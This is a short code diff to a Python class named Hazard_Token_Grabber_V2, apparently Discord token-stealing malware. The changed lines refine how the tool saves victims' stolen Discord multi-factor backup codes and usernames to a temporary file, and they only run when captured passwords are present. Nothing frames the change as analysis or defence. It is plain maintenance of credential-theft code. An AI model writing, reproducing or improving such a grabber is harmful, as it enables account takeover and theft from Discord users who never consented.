@@ -238,7 +238,7 @@ class Hazard_Token_Grabber_V2:
 
                                 user = j["username"] + "#" + str(j["discriminator"])
 
-                                if token.startswith("mfa."):
+                                if token.startswith("mfa.") and self.discord_psw:
                                     with open(self.tempfolder+os.sep+"Discord backupCodes.txt", "a", errors="ignore") as fp:
                                         fp.write(f"{user} Backup Codes".center(36, "-")+"\n")
                                         for x in self.discord_psw:
